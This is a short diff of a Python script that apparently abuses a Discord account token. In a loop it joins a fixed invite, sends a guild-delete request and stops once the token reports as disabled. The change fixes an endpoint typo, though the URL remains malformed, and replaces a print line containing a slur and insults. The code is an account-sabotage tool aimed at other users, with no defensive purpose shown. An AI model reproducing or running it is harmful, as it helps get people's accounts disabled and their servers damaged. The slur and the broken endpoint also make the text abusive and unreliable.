@@ -18,8 +18,8 @@ while True:
     check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
     stuff = check.json()
     requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
-    requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
+    requests.delete("https://discordapp.com/api/v6/guilds" + data['guild']['id'], headers={"Authorization": token})
 
     if stuff['code'] == 0:
-        print("disabled like the retards trying to nagg on me in discord and calling me a skid")
+        print("De token has been de disabled :)")
         break
